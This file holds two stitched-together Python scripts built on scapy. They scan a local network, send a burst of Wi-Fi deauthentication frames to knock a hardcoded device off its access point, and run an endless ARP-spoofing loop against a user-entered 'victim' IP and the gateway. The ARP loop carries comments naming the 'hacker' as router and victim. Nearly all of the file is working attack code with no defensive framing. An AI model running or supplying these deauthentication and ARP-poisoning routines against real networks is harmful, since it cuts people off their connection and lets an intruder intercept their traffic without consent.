# -*- coding: utf-8 -*-
"""
Created on Fri Mar 13 02:43:29 2020

@author: Tejas
### install wincap - https://www.winpcap.org/install/ (2 mins)
"""




  
#### Print my Ip Address    
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
print("My ip Address = ", s.getsockname()[0])
myIp = s.getsockname()[0]
s.close()    
 


### Create an ip to scan
def scan_ip(myIp):
    a = myIp.split('.')
    a[-1] = '0'
    scanIp = '.'.join(a) + '/24'  
    return scanIp

scan_ip = scan_ip(myIp)






### Print stuff on command line
from subprocess import PIPE, Popen
import time

def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]


def vendor(mac_add):
    url = "curl http://api.macvendors.com/" + mac_add
    a =  cmdline(url)
    time.sleep(1)
    return a

vendor("98:46:0a:0f:f0:3f")












from scapy.all import ARP, Ether, srp

target_ip = scan_ip
# IP Address for the destination
# create ARP packet
arp = ARP(pdst=target_ip)
# create the Ether broadcast packet
# ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
# stack them
packet = ether/arp

result = srp(packet, timeout=3, verbose=0)[0]

# a list of clients, we will fill this in the upcoming loop
clients = []
iplists = []
maclist = []
vendorlist = []

for sent, received in result:
    
    iplists.append(received.psrc)
    maclist.append(received.hwsrc)
    vendorlist.append(vendor(str(received.hwsrc)))
    clients.append({'ip': received.psrc, 'mac': received.hwsrc})

# print clients
print("Available devices in the network:")

import pandas as pd

final = pd.DataFrame()
final['IP'] = iplists
final['Mac'] = maclist
final['Vendor'] = vendorlist
    








from scapy.all import Dot11, RadioTap, sendp, Dot11Deauth

target_mac = "'8c:85:90:5c:2d:94'"
gateway_mac = "b0:52:16:f8:34:dd"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, verbose=1)
  
    





import scapy.all as scapy

scapy.arping('192.168.0.0/24')

    




# -*- coding: utf-8 -*-
"""
Created on Fri Mar 13 02:40:49 2020

@author: haris
"""
import socket    
from netaddr import *
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
myip = s.getsockname()[0]
s.close()

subnet = '/24' # Find a way to get subnet mask
myipadd = str(IPNetwork(myip + subnet).network) + subnet
myipadd



client = []
from scapy.all import *
def scan1(ip):
    arp_packet = ARP(psrc='192.168.0.150', pdst=ip)
    broadcast_packet = Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = srp(arp_broadcast_packet, timeout = 1, verbose = False)[0]
    
    for sent,received in answered_list:
        client.append({'IP':received.psrc, 'MAC':received.hwsrc})
   
scan1(myipadd) # Add OS in the dictionary

for i in range (0,len(client)):
    try:
        client[i]['DNS'] = socket.gethostbyaddr(str(client[i]['IP']))[0]
    except:
        client[i]['DNS'] = 'Not Found'
        continue
print(client)
    
victimIP = input('Enter the Victim IP')

import netifaces
gws=netifaces.gateways()
gatewayip = ((gws['default'])[2])[0]


for i in range (0,len(client)):
    if client[i]['IP'] == gatewayip:
        gatewayMAC = (client[i]['MAC'])
           
for i in range (0,len(client)):
    if client[i]['IP'] == victimIP:
        victimMAC = (client[i]['MAC'])

while True:
    packet = ARP(op=1, pdst=victimIP, hwdst= victimMAC, psrc= gatewayip)
    send(packet) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.

    packet = ARP(op=1, pdst= gatewayip , hwdst=gatewayMAC, psrc= victimIP)
    send(packet) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.
    
    
    
    